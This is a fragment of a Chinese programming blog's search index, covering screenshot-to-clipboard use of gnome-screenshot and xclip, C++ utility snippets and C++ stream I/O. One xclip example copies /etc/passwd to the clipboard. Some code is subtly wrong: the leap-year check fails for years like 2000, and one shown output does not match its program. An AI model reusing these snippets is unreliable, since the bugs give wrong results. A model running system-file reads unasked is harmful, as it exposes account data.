gnome-screenshot -w -b 12345# 区域截图，并将截图复制到剪贴板$ gnome-screenshot -acbp# 区域截图，并将截图输出到指定的文件$ gnome-screenshot -abpf screenshot.png 截图工具的参数说明123456789101112-c, --clipboard 将截图直接发送到剪贴板-w, --window 截取窗口，而不是整个屏幕-a, --area 截取屏幕的一个区域，而不是整个屏幕-b, --include-border 在截图中包含窗口边框-B, --remove-border 去除屏幕截图的窗口边框-p, --include-pointer 在截图中包含鼠标指针-d, --delay=秒 在指定延迟后截图[以秒计]-e, --border-effect=特效 添加到边框的特效（阴影、边框、老照片或无特效）-i, --interactive 交互设置选项-f, --file=文件名 将截图直接保存为该文件--version 打印版本信息并退出--display=显示 要使用的 X 显示 xclip 的安装功能说明xclip 是一个剪贴板的命令行实用工具，它可以从标准文件或文件中读取数据（文本、图片）并将其放置在剪贴板里，也可以将剪贴板里的数据（文本、图片）输出到标准文件或文件中。xclip 详细的功能说明如下，适用于 Debian/Ubuntu/CentOS/Arch 等主流的 Linux 发行版。 Accesses the cut-buffers Prints contents of selection to standard out Waits for selection requests in the background Supports the INCR mechanism for large transfers Reads data piped to standard in or files given as arguments Accesses the XA_PRIMARY, XA_SECONDARY or XA_CLIPBOARD selection Connects to the X display in $DISPLAY, or specified with -display host:0 依赖安装CentOS/Fedora 1# yum install -y libXmu libXmu-devel Debian/Ubuntu 1# apt-get install -y libx11-dev libxmu-headers libxt-dev libxmu-dev 编译安装12345678910111213141516# 克隆代码# git clone https://github.com/astrand/xclip.git# 进入源码目录# cd xclip# 预配置# autoreconf# ./configure# 编译# make# 安装# make install# make install.man 验证安装12345678# 查看版本号$ xclip -versionxclip version 0.13Copyright (C) 2001-2008 Kim Saunders et al.Distributed under the terms of the GNU GPL# 查看命令手册$ man xclip xclip 的使用示例图片的使用示例 将图片复制到剪贴板 12345# 第一步：区域截图，将截图输出到指定的文件$ gnome-screenshot -abpf screenshot.png# 第二步：将指定的图片复制到剪贴板$ xclip -selection clipboard -t image/png -i screenshot.png 将剪贴板的图片输出到指定的文件 12345# 第一步：区域截图，并将截图复制到剪贴板$ gnome-screenshot -acbp# 第二步：将剪贴板的图片输出到指定的文件$ xclip -selection clipboard -t image/png -o &gt; clipboard.png 完整的使用示例12345678910111213141516171819## Copy your uptime into the selection for pasting:$ uptime | xclip## Copy your password file for pasting:$ xclip /etc/passwd## Save some text you have Edit | Copied in a web browser:$ xclip -o -sel clip &gt; webpage.txt## Open a URL selected in an email client$ mozilla `xclip -o`## Copy XA_PRIMARY to XA_CLIPBOARD$ xclip -o | xclip -sel clip## In command mode in vim, select some lines of text, then press shift-:## for an ex prompt, and use this command to copy the selected lines of## text to the primary X selection:$ !xclip -f 值得一提的是，xclip 自身还提供了 xclip-copyfile、xclip-pastefile、xclip-cutfile 命令行工具，支持在不同的目录和机器之间拷贝和移动文件，详见：官方文档 VS Code 使用说明在 Linux 系统下，VS Code 的 MarkDown 粘贴插件，例如 Markdown Paste 底层使用了 xclip，且版本必须大于等于 0.13.0，否则这类插件无法正常将剪贴板里的图片粘贴到 MarkDown 文件里。 参考资料 Copy image from clipboard to file GNOME Screenshot can’t copy to clipboard in Ubuntu 18.04 How to copy image to clipboard, to paste to another application How to copy an image to the clipboard from a file using command line var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux"},{title:"C++ 开发常用代码块之一",url:"/posts/b84a96ac.html",text:'日期处理获取时间戳1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;chrono&gt;using namespace std;// 获取时间戳（秒数）// dateTime: 日期时间字符串，格式：2021-01-08 21:27:00long getTimestamp(const string &amp;dateTime) { tm tm = {}; strptime(dateTime.c_str(), "%Y-%m-%d %H:%M:%S", &amp;tm); chrono::system_clock::time_point tp = chrono::system_clock::from_time_t(mktime(&amp;tm)); long milliseconds = chrono::duration_cast&lt;chrono::milliseconds&gt;(tp.time_since_epoch()).count(); return milliseconds / 1000;}int main() { long timestamp = getTimestamp("2021-01-08 21:27:00"); cout &lt;&lt; "timestamp = " &lt;&lt; timestamp &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 1timestamp = 1610112420 格式化当前时间12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;time.h&gt;using namespace std;// 格式化当前时间// 默认格式是: 2020-06-07 23:46:53string formatCurrentTime() { time_t rawtime; struct tm* info; char buffer[80]; time(&amp;rawtime); info = localtime(&amp;rawtime); strftime(buffer, 80, "%Y-%m-%d %H:%M:%S", info); string str(buffer); return str;}// 格式化当前时间// format: 格式字符串，例如 %Y-%m-%d %H:%M:%Sstring formatCurrentTime(string format) { time_t rawtime; struct tm* info; char buffer[80]; time(&amp;rawtime); info = localtime(&amp;rawtime); strftime(buffer, 80, format.c_str(), info); string str(buffer); return str;}int main() { cout &lt;&lt; formatCurrentTime() &lt;&lt; endl; cout &lt;&lt; formatCurrentTime("%Y-%m-%d") &lt;&lt; endl;} 程序运行输出的结果如下： 122021-11-22 22:52:432021-11-22 计算指定的日期是星期几12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;sstream&gt;using namespace std;// 根据给定的日期，计算它是星期几// date: 日期字符串，格式是: 2021-12-01// 返回值：1, 2, 3, 4, 5, 6, 0, 其中 0 表示星期日int dayOfWeek(const string &amp;date) { char c; int y, m, d; stringstream(date) &gt;&gt; y &gt;&gt; c &gt;&gt; m &gt;&gt; c &gt;&gt; d; tm t = {0, 0, 0, d, m - 1, y - 1900}; mktime(&amp;t); return t.tm_wday;}// 根据给定的日期，判断是否为周末// date: 日期字符串，格式是: 2021-12-01bool isWeekendDays(const string &amp;date) { int wday = dayOfWeek(date); if (wday == 6 || wday == 0) { return true; } return false;}int main() { cout &lt;&lt; dayOfWeek("2022-01-07") &lt;&lt; endl; cout &lt;&lt; dayOfWeek("2022-01-08") &lt;&lt; endl; cout &lt;&lt; dayOfWeek("2022-01-09") &lt;&lt; endl; cout &lt;&lt; dayOfWeek("2022-01-10") &lt;&lt; endl; cout &lt;&lt; (isWeekendDays("2022-01-09") ? "true" : "false") &lt;&lt; endl;} 程序运行输出的结果如下： 123455601true 计算两个日期之间的天数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include &lt;iostream&gt;using namespace std;// 判断一个年份是否为闰年bool isLeap(int year) { return (year % 4 == 0 || year % 400 == 0) &amp;&amp; (year % 100 != 0);}// 计算特定年份的天数int daysOfYear(int year) { return isLeap(year) ? 366 : 365;}// 根据给定的日期，计算它在该年的第几天int dayOfYear(int year, int month, int day) { int DAY[12] = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 }; if (isLeap(year)) { DAY[1] = 29; } for (int i = 0; i &lt; month - 1; ++i) { day += DAY[i]; } return day;}// 判断日期字符串是否合法，并分别取出日期中的年月日// date: 日期字符串，格式是: 20211201bool stringToDate(string date, int&amp; year, int&amp; month, int&amp; day) { year = atoi(date.substr(0, 4).c_str()); month = atoi(date.substr(4, 2).c_str()); day = atoi(date.substr(6, 2).c_str()); int DAY[12] = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 }; if (isLeap(year)) { DAY[1] = 29; } return year &gt;= 0 &amp;&amp; month &lt;= 12 &amp;&amp; month &gt; 0 &amp;&amp; day &lt;= DAY[month - 1] &amp;&amp; day &gt; 0;}// 计算两个日期之间的天数// date1: 日期字符串，格式是: 20211201// date2: 日期字符串，格式是: 20211201// 当返回值为 -1 时，说明日期的格式不正确int daysBetween2Date(string date1, string date2) { int year1, month1, day1; int year2, month2, day2; if (!stringToDate(date1, year1, month1, day1) || !stringToDate(date2, year2, month2, day2)) { cout &lt;&lt; "输入的日期格式不正确"; return -1; } if (year1 == year2 &amp;&amp; month1 == month2) { return day1 &gt; day2 ? day1 - day2 : day2 - day1; } else if (year1 == year2) { int d1, d2; d1 = dayOfYear(year1, month1, day1); d2 = dayOfYear(year2, month2, day2); return d1 &gt; d2 ? d1 - d2 : d2 - d1; } else { // 确保year1年份比year2早 if (year1 &gt; year2) { swap(year1, year2); swap(month1, month2); swap(day1, day2); } // 计算第一个日期在该年还剩多少天 int d1, d2, d3; if (isLeap(year1)) { d1 = 366 - dayOfYear(year1, month1, day1); } else { d1 = 365 - dayOfYear(year1, month1, day1); } // 计算第二日期在当年中的第几天 d2 = dayOfYear(year2, month2, day2); // 计算两个年份相隔的天数 d3 = 0; for (int year = year1 + 1; year &lt; year2; year++) { if (isLeap(year)) d3 += 366; else d3 += 365; } return d1 + d2 + d3; }}int main() { int days = daysBetween2Date("20101111", "20111111"); cout &lt;&lt; "相差 " &lt;&lt; days &lt;&lt; " 天" &lt;&lt; endl; int days2 = daysBetween2Date("20200202", "20200131"); cout &lt;&lt; "相差 " &lt;&lt; days2 &lt;&lt; " 天" &lt;&lt; endl; int days3 = daysBetween2Date("20230712", "20050619"); cout &lt;&lt; "相差 " &lt;&lt; days3 &lt;&lt; " 天" &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 123相差 365 天相差 2 天相差 6597 天 加载动态库加载动态库（.so）提示 下述示例代码，适用于 Linux 系统的 C++ 开发。 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;dlfcn.h&gt;#include &lt;stdlib.h&gt;#include &lt;iostream&gt;using namespace std;int main(){ int a = 0; // 加载动态库 void *handle = dlopen("./libadd_c.so", RTLD_LAZY); if(!handle) { printf("open lib error\\n"); cout&lt;&lt;dlerror()&lt;&lt;endl; return -1; } // 定义函数指针类型 typedef int (*add_t)(int a, int b); // 调用动态库 add_t add = (add_t) dlsym(handle, "add"); if(!add) { cout&lt;&lt;dlerror()&lt;&lt;endl; dlclose(handle); return -1; } a = add(3, 4); printf("a = %d\\n",a); // 释放动态库 dlclose(handle); return 0;} 加载动态链接库（.dll）提示 下述示例代码，适用于 Windows 系统的 C++ 开发。 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;windows.h&gt;using namespace std;int main() { HINSTANCE hInstance; // 加载动态链接库 hInstance = LoadLibrary("./socketclient.dll"); if (hInstance == NULL) { printf("LoadLibrary() 调用失败, ErrorCode: %d", GetLastError()); return -1; } // 定义函数类型指针 typedef int (*CltSocketInit)(void** handle); // 调用动态链接库 CltSocketInit cltSocketInit = (CltSocketInit)GetProcAddress(hInstance, "cltSocketInit"); if (cltSocketInit != NULL) { void* handle = NULL; int result = cltSocketInit(&amp;handle); printf("result = %d", result); } // 释放动态链接库 if (hInstance != NULL) { FreeLibrary(hInstance); } return 0;} 任务调度定时器提示 基于 C++ 11 实现等价于 Javascript 的 setTimeout() 和 setInterval() 函数。 timer.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;chrono&gt;#include &lt;atomic&gt;using namespace std;class Timer {public: typedef void(TimerFunction)();public: void setTimeout(TimerFunction, long delay); void setInterval(TimerFunction, long interval); void stop();private: atomic&lt;bool&gt; active{ true };};void Timer::setTimeout(TimerFunction function, long delay) { active = true; thread t([=]() { if (!active.load()) return; this_thread::sleep_for(chrono::milliseconds(delay)); if (!active.load()) return; function(); }); t.detach();}void Timer::setInterval(TimerFunction function, long interval) { active = true; thread t([=]() { while (active.load()) { this_thread::sleep_for(chrono::milliseconds(interval)); if (!active.load()) return; function(); } }); t.detach();}void Timer::stop() { active = false;} main.cpp 12345678910111213141516171819#include &lt;conio.h&gt;#include &lt;iostream&gt;#include "timer.h"using namespace std;void refreshConfig() { cout &lt;&lt; "execute refresh config ..." &lt;&lt; endl;}int main() { // 使用智能指针 unique_ptr&lt;Timer&gt; timer(new Timer()); Timer::TimerFunction* refreshFunc = refreshConfig; timer-&gt;setInterval(refreshConfig, 3000); timer-&gt;setTimeout(refreshConfig, 5000); _getch(); return 0;} 程序运行输出的结果如下： 12345execute refresh config ...execute refresh config ...execute refresh config ...execute refresh config ...execute refresh config ... 线程休眠sleep() 函数的功能是让程序的执行挂起一段时间，也就是等待一段时间再继续往下执行。 不同平台和不同编译器的区别 sleep() 函数在 Linux 平台的头文件是 unistd.h sleep() 函数在 Windows 平台的头文件是 windows.h sleep() 函数的名称是区分大小写的，有的编译器是大写，有的是小写 sleep() 函数休眠的时间，在 Windows 平台下是以 毫秒 为单位，而在 Linux 平台是以 秒 为单位 123456789101112131415// Windows平台的写法#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;windows.h&gt;int main(){ int a = 1; while (a) { printf("Welcome to songjiahao\'s blog\\n"); Sleep(1000); } system("pause"); return 0;} 文件处理创建文件夹提示 下述 C++ 代码兼容 Linux 与 Windows 平台，用于创建文件夹以及子文件夹 fileutil.h 123456789101112131415161718192021222324#pragma once#ifdef WIN32#include &lt;io.h&gt;#include &lt;direct.h&gt;#else#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#endif#ifdef WIN32#define ACCESS(fileName, accessMode) _access(fileName, accessMode)#define MKDIR(path) _mkdir(path)#else#define ACCESS(fileName, accessMode) access(fileName, accessMode)#define MKDIR(path) mkdir(path, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH)#endif#include &lt;iostream&gt;#define MAX_PATH_LEN 256using namespace std;int32_t createDirectory(const string &amp;dirPath); fileutil.cpp 123456789101112131415161718192021222324#include "fileutil.h"// 根据目录路径，从左到右依次判断目录是否存在，不存在则创建// 注意：最后一个如果是目录的话，则必须加上 \'\\\\\' 或者 \'/\'// 示例: /usr/local/scripts/int32_t createDirectory(const string &amp;dirPath) { uint32_t dirPathLen = dirPath.length(); if (dirPathLen &gt; MAX_PATH_LEN) { return -1; } char tmpDirPath[MAX_PATH_LEN] = {0}; for (uint32_t i = 0; i &lt; dirPathLen; ++i) { tmpDirPath[i] = dirPath[i]; if (tmpDirPath[i] == \'\\\\\' || tmpDirPath[i] == \'/\') { if (ACCESS(tmpDirPath, 0) != 0) { int32_t ret = MKDIR(tmpDirPath); if (ret != 0) { return ret; } } } } return 0;} 字符串处理分割字符串1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;// 分割字符串// str: 要分割的字符串// delim: 分割字符vector&lt;string&gt; split(const string &amp;str, const char &amp;delim = \' \') { vector&lt;string&gt; tokens; size_t lastPos = str.find_first_not_of(delim, 0); size_t pos = str.find(delim, lastPos); while (lastPos != string::npos) { tokens.emplace_back(str.substr(lastPos, pos - lastPos)); lastPos = str.find_first_not_of(delim, pos); pos = str.find(delim, lastPos); } return tokens;}int main() { vector&lt;string&gt; strResult = split("Hello,World,!", \',\'); for (auto it = strResult.begin(); it != strResult.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; }} 程序运行输出的结果如下： 1Hello World ! 去除字符串两边的空格1234567891011121314151617181920#include &lt;iostream&gt;using namespace std;// 去除字符串两边的空格void trim(string &amp;str) { if (str.empty()) { return; } str.erase(0, str.find_first_not_of(" ")); str.erase(str.find_last_not_of(" ") + 1);}int main() { string str = " hello "; trim(str); cout &lt;&lt; "str=" &lt;&lt; str &lt;&lt; endl; string str2 = str + "world"; cout &lt;&lt; "str2=" &lt;&lt; str2 &lt;&lt; endl;} 程序运行输出的结果如下： 12str=hellostr2=helloworld 判断字符串是否为空串12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;using namespace std;// 去除字符串两边的空格void trim(string &amp;str) { if (str.empty()) { return; } str.erase(0, str.find_first_not_of(" ")); str.erase(str.find_last_not_of(" ") + 1);}// 判断字符串是否为空串// "" -&gt; true// " " -&gt; true// "a" -&gt; false// " a " -&gt; falsebool empty(const string &amp;str) { if (str.empty()) { return true; } string strTemp = str; trim(strTemp); return strTemp.length() == 0;}int main() { string str1 = ""; string str2 = " "; string str3 = "a"; string str4 = " a "; cout &lt;&lt; (empty(str1) ? "true" : "false") &lt;&lt; endl; cout &lt;&lt; (empty(str2) ? "true" : "false") &lt;&lt; endl; cout &lt;&lt; (empty(str3) ? "true" : "false") &lt;&lt; endl; cout &lt;&lt; (empty(str4) ? "true" : "false") &lt;&lt; endl;} 程序运行输出的结果如下： 1234truetruefalsefalse 转换字符集编码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 // Gb2312 转换 Utf8 编码// iInLen的长度不包括\'\\0\'字符，应该用strlen()，返回值是处理后的sOut长度int Gb2312ToUtf8(char *sOut, int iMaxOutLen, const char *sIn, int iInLen) { char *pIn = (char *) sIn; char *pOut = sOut; size_t ret; size_t iLeftLen = iMaxOutLen; iconv_t cd; cd = iconv_open("utf-8", "gb2312"); if (cd == (iconv_t) -1) { return -1; } size_t iSrcLen = iInLen; ret = iconv(cd, &amp;pIn, &amp;iSrcLen, &amp;pOut, &amp;iLeftLen); if (ret == (size_t) -1) { iconv_close(cd); return -1; } iconv_close(cd); return (iMaxOutLen - iLeftLen);}// Utf8 转换 Gb2312 编码// iInLen的长度不包括\'\\0\'字符，应该用strlen()，返回值是处理后的sOut长度int Utf8ToGb2312(char *sOut, int iMaxOutLen, const char *sIn, int iInLen) { char *pIn = (char *) sIn; char *pOut = sOut; size_t ret; size_t iLeftLen = iMaxOutLen; iconv_t cd; cd = iconv_open("gb2312", "utf-8"); if (cd == (iconv_t) -1) { return -1; } size_t iSrcLen = iInLen; ret = iconv(cd, &amp;pIn, &amp;iSrcLen, &amp;pOut, &amp;iLeftLen); if (ret == (size_t) -1) { iconv_close(cd); return -1; } iconv_close(cd); return (iMaxOutLen - iLeftLen);} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++ 代码块"},{title:"C++ 进阶基础之四",url:"/posts/791ffdcd.html",text:'标准 I/O 流的介绍I/O 流的概念程序的输入指的是从输入文件将数据传送给程序，程序的输出指的是从程序将数据传送给输出文件。C++ 的输入输出包含以下三个方面的内容： 对系统指定的标准设备的输入和输出：即从键盘输入数据，输出到显示器屏幕。这种输入输出称为标准的输入输出，简称 标准 I/O。 以外存磁盘文件为对象进行输入和输出：即从磁盘文件输入数据，数据输出到磁盘文件。以外存文件为对象的输入输出称为文件的输入输出，简称 文件 I/O。 对内存中指定的空间进行输入和输出：通常指定一个字符数组作为存储空间（实际上可以利用该内存空间存储任何信息）。这种输入和输出称为字符串输入输出，简称 串 I/O。 I/O 流类库的结构在 C 语言中，用 printf 和 scanf 进行输入输出，往往不能保证所输入输出的数据是可靠的安全的。在 C++ 的输入输出中，编译系统对数据类型进行严格的检查，凡是类型不正确的数据都不可能通过编译。因此 C++ 的 I/O 操作是类型安全（Type Safe）的。C++ 的 I/O 操作是可扩展的，不仅可以用来输入输出标准类型的数据，也可以用于用户自定义类型的数据。C++ 通过 I/O 类库来实现丰富的 I/O 功能。这样使 C++ 的输人输出明显地优于 C 语言中的 printf 和 scanf，但是也为之付出了代价，C++ 的 I/O 系统因此变得比较复杂，要掌握许多使用细节。C++ 编译系统提供了用于输入输出的 iostream 类库。iostream 这个单词是由 3 个部分组成的，即 i-o-stream，意为输入输出流。在 iostream 类库中包含许多用于输入输出的类，如下图所示： ios 是抽象基类，由它派生出 istream 类和 ostream 类，两个类名中第 1 个字母 i 和 o 分别代表输入（input）和输出（output）。istream 类支持输入操作，ostream 类支持输出操作，iostream 类支持输入输出操作。iostream 类是从 istream 类和 ostream 类通过多重继承而派生的类，其继承层次如下图所示： iostream 类库中不同的类的声明被放在不同的头文件中，用户在自己的程序中用 #include 命令包含了有关的头文件，这就相当于在本程序中声明了所需要用到的类。可以换 — 种说法：头文件是程序与类库的接口。iostream 类库的接口分别由不同的头文件来实现，常用的头文件如下： strstream：用于字符串流 I/O fstream：用于实现文件的 I/O 操作 iomanip：在使用格式化 I/O 时，应包含此头文件 iostream：包含了对输入输出流进行操作所需的基本信息 stdiostream：用于混合使用 C 语言和 C++ 的 I/O 机制，例如希望将 C 语言程序转变为 C++ 程序 在 iostream 头文件中定义的类有 ios，istream，ostream，iostream，istream_withassign，ostream_withassign，iostream_withassign 等。在 iostream 头文件中不仅定义了相关的类，还定义了 4 种标准 I/O 对象，如下所示： &lt;&lt; 和 &gt;&gt; 本来在 C++ 中是被定义为左位移运算符和右位移运算符的，由于在 iostream 头文件中对它们进行了重载，使它们能用作标准类型数据的输入和输出运算符。所以，在使用到它们的程序中必须用 #include &lt;iostream&gt; 命令将其包含到程序中。在 iostream 中只对 &lt;&lt; 和 &gt;&gt; 运算符用于标准类型数据的输入输出进行了重载，但未对用户声明的类型数据的输入输出进行重载。如果用户声明了新的类型，并希望用 &lt;&lt; 和 &gt;&gt; 运算符对其进行输入输出，则需要按照 C++ 的运算符重载规则来做。 标准 I/O 流的使用标准输入流的简单使用标准输入流对象 cin 的常用函数如下： cin.get()，一次只能读取一个字符 cin.get(一个参数)，读一个字符 cin.get(多个参数)，可以读字符串 cin.getline()，读取整行字符串，包括读取空格字符 cin.ignore()，用于忽略或清除输入缓冲区中的一个或多个字符 cin.putback()，将数据放回缓冲区 cin.peek()，返回值是一个 char 型的字符，即指针指向的当前字符，但它只是观测指针停留在当前的位置并不后移；如果要访问的字符是文件结束符，则函数的返回值是 EOF 或者 -1 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include &lt;iostream&gt;using namespace std;void input1() { int number; cout &lt;&lt; "请输入一个数字: "; cin &gt;&gt; number; cout &lt;&lt; "输入的数字是: " &lt;&lt; number &lt;&lt; endl;}void input2() { char buf[1024]; cout &lt;&lt; "请输入字符串: "; cin &gt;&gt; buf; // 当遇到空格符时，会停止接收数据输入 cout &lt;&lt; "输入的字符串: "; cout &lt;&lt; buf &lt;&lt; endl;}void input3() { char ch; cout &lt;&lt; "请输入字符串: "; while ((ch = cin.get()) != EOF) // 如果缓冲区没有数据，则程序会阻塞 { cout &lt;&lt; ch &lt;&lt; " "; }}void input4() { char a, b, c; cout &lt;&lt; "请输入字符串: "; cin.get(a); // 如果缓冲区没有数据，则程序会阻塞 cin.get(b); cin.get(c); cout &lt;&lt; a &lt;&lt; b &lt;&lt; c;}void input5() { char buf[256]; cout &lt;&lt; "请输入字符串: "; cin.getline(buf, 256); // 当遇到空格符时，不会停止接收数据输入 cout &lt;&lt; buf &lt;&lt; endl;}void input6() { char buf1[256]; char buf2[256]; cout &lt;&lt; "请输入字符串:"; // 例如输入：abc efghi cin &gt;&gt; buf1; cin.ignore(2); // 忽略缓冲区的数据 cin.getline(buf2, 256); cout &lt;&lt; buf1 &lt;&lt; endl; cout &lt;&lt; buf2 &lt;&lt; endl;}void input7() { char buf1[256]; char buf2[256]; cout &lt;&lt; "请输入字符串:"; // 例如输入：abc efghi cin &gt;&gt; buf1; cin.ignore(2); int num = cin.peek(); // 查看缓冲区是否有数据 cout &lt;&lt; num &lt;&lt; endl; cin.getline(buf2, 256); cout &lt;&lt; buf1 &lt;&lt; endl; cout &lt;&lt; buf2 &lt;&lt; endl;}void input8() { // 分开处理输入的整数和字符 cout &lt;&lt; "Please, enter a number or a word: "; char c = std::cin.get(); if ((c &gt;= \'0\') &amp;&amp; (c &lt;= \'9\')) { int n; cin.putback(c); // 将数据放回缓冲区 cin &gt;&gt; n; cout &lt;&lt; "You entered a number: " &lt;&lt; n &lt;&lt; \'\\n\'; } else { char ch; cin.putback(c); // 将数据放回缓冲区 cin.get(ch); cout &lt;&lt; "You entered a character: " &lt;&lt; ch &lt;&lt; \'\\n\'; }} 标准输出流的简单使用标准输出流对象 cout 的常用函数如下： cout.flush() cout.put() cout.write() cout.width() cout.fill() cout.setf() 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include &lt;iomanip&gt;using namespace std;void output1() { cout.put(\'h\').put(\'e\').put(\'l\').put(\'l\').put(\'o\').put(\'\\n\');}void output2() { char* str = "hello world\\n"; cout.write(str, strlen(str));}void output3() { // 第一种方式：使用流对象的成员函数 cout &lt;&lt; "&lt;Start&gt;"; cout.width(30); cout.fill(\'*\'); cout.setf(ios::showbase); cout.setf(ios::internal); cout &lt;&lt; hex &lt;&lt; 123 &lt;&lt; "&lt;End&gt;\\n";}void output4() { // 第二种方式：使用控制符 cout &lt;&lt; "&lt;Start&gt;" &lt;&lt; setw(30) &lt;&lt; setfill(\'*\') &lt;&lt; setiosflags(ios::showbase) &lt;&lt; setiosflags(ios::internal) &lt;&lt; hex &lt;&lt; 123 &lt;&lt; "&lt;End&gt;\\n";}int main() { output1(); output2(); output3(); output4(); return 0;} 程序运行输出的结果如下： 1234hellohello world&lt;Start&gt;0x**************************7b&lt;End&gt;&lt;Start&gt;0x**************************7b&lt;End&gt; 文件 I/O 流的简单使用以普通的方式读写文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;#include "fstream"using namespace std;void writeFile() { // 打开文件 char* fname = "D:/file.txt"; ofstream fout(fname); if (fout) { fout &lt;&lt; "Hello World" &lt;&lt; endl; fout.flush(); fout.close(); }}void readFile() { // 读取文件 char ch; char* fname = "D:/file.txt"; ifstream fin(fname); if (fin) { while (fin.get(ch)) { cout &lt;&lt; ch; } fin.close(); }}void writeFileApp() { // 以追加的方式打开文件 char* fname = "D:/file.txt"; ofstream fout(fname, ios::app); if (fout) { fout &lt;&lt; "What" &lt;&lt; endl; fout.flush(); fout.close(); }}int main() { writeFile(); readFile(); writeFileApp(); readFile(); return 0;} 程序运行输出的结果如下： 123Hello WorldHello WorldWhat 以二进制的方式读写文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;iostream&gt;#include "fstream"using namespace std;class Teacher {public: Teacher() { age = 33; strcpy(name, ""); } Teacher(int _age, char* _name) { age = _age; strcpy(name, _name); } void print() { cout &lt;&lt; "age:" &lt;&lt; age &lt;&lt; ", name:" &lt;&lt; name &lt;&lt; endl; }private: int age; char name[32];};int main() { char* fname = "D:/file.dat"; ofstream fout(fname, ios::binary); if (!fout) { cout &lt;&lt; "打开文件失败" &lt;&lt; endl; return 0; } // 将类对象写入二进制文件（序列化） Teacher t1(23, "Jim"); Teacher t2(26, "Tom"); fout.write((char*)&amp;t1, sizeof(Teacher)); fout.write((char*)&amp;t2, sizeof(Teacher)); fout.flush(); fout.close(); ifstream fin(fname); if (!fin) { cout &lt;&lt; "打开文件失败" &lt;&lt; endl; return 0; } // 从二进制文件读取类对象（反序列化） Teacher tmp; fin.read((char*)&amp;tmp, sizeof(Teacher)); tmp.print(); fin.read((char*)&amp;tmp, sizeof(Teacher)); tmp.print(); fin.close(); return 0;} 程序运行输出的结果如下： 12age:23, name:Jimage:23, name:Jim var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c++"},{title:"C++ 进阶基础之三",url:"/posts/35cd91d3.html",text:'类型转换类型转换的语法 C 语言风格的强制类型转换（Type Cast）很简单，不管什么类型的转换，语法都是：TYPE b = (TYPE) a C++ 风格的类型转换，提供了 4 种类型转换操作符来应对不同场合的应用 const_cast：去除变量的 const 只读属性 reinterpreter_cast：重新解释类型（强制类型转换） static_cast：静态类型转换，如 int 转换成 char dynamic_cast：动态类型转换，如父类和子类之间的多态类型转换 C++ 4 种类型转换的语法：TYPE B = static_cast&lt;TYPE&gt; (a) 类型转换的一般性介绍一般性介绍： a) const_cast&lt;&gt;()：去除变量的 const 只读属性 b) reinterpret_cast&lt;&gt;()：重新解释类型，不同类型之间会进行强制类型转换 c) dynamic_cast&lt;&gt;()：动态类型转换，安全的基类和派生类之间转换，运行时会做类型检查 d) static_cast&lt;&gt;()：静态类型转换，编译的时候 C++ 编译器会做类型检查，基本类型都能转换，但是不能转换指针类型（多态除外） 一般性结论： a) 在 C 语言中，不能隐式类型转换的，在 C++ 中可以用 reinterpret_cast&lt;&gt;() 进行强行类型解释 b) 在 C 语言中，能隐式类型转换的，在 C++ 中可用 static_cast&lt;&gt;() 进行类型转换，因为 C++ 编译器在编译的时候，一般都可以顺利通过类型检查 c) static_cast&lt;&gt;() 和 reinterpret_cast&lt;&gt;() 基本上把 C 语言中的强制类型转换功能给覆盖了，但 reinterpret_cast&lt;&gt;() 很难保证代码的移植性 类型转换的简单使用案例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#include 